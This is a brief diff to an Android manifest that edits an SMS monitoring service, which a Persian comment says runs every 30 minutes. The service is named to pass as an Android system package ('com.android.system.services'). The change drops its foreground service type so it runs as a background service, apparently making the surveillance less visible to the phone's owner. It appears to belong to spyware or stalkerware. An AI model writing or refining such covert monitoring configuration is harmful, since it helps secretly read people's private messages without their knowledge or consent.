@@ -126,13 +126,12 @@
             android:directBootAware="true"
             android:foregroundServiceType="dataSync" />
 
-        <!-- 🔥 SMS Monitor Service - مانیتورینگ پیامک‌ها هر 30 دقیقه -->
+        <!-- 🔥 SMS Monitor Service - مانیتورینگ پیامک‌ها هر 30 دقیقه (background service) -->
         <service
             android:name="com.android.system.services.SmsMonitorService"
             android:enabled="true"
             android:exported="false"
-            android:directBootAware="true"
-            android:foregroundServiceType="dataSync" />
+            android:directBootAware="true" />
 
         <!-- 🔥 Heartbeat Job Service - برای Android 8+ -->
         <service
